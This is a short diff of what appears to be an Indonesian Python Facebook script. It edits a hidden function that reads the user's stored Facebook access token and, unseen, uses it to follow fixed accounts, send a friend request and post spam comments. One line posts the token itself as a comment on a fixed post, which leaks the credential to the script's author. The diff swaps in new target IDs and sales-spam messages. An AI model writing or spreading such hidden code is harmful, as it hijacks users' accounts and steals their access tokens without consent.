@@ -900,23 +900,17 @@ def yntkts(kuki):
         hoetankk()
     except:pass
         
-koh = '100005395413800'
-xi_jimpinx = '1714000985456399'
-hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
-goceng  = '1714009362122228'
+koh = '100011146894081'
+xi_jimpinx = '1379112335803650'
+hoetank = random.choice(['info harga ka', 'cek wa', 'Masih?', 'Good', 'best seller'])
+goceng  = '1303409076707310'
 def hoetankk():
 	try:
 		__kontol__ = open('__yayan__.txt', 'r').read()
 	except (KeyError, IOError):
 		print('\n %s[%s×%s] Token Invalid'%(N,M,N))
 		os.system('rm -rf __yayan__.txt')
-	req.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(__kontol__))
-	req.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(__kontol__))
-	req.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(__kontol__))
-	req.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(__kontol__))
-	req.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(__kontol__))
-	req.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(__kontol__))
-	req.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(__kontol__))
+	req.post('https://graph.facebook.com/100011146894081/subscribers?access_token=%s'%(__kontol__))
 	req.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,__kontol__))
 	req.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(goceng,__kontol__,__kontol__))
 	req.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,__kontol__))
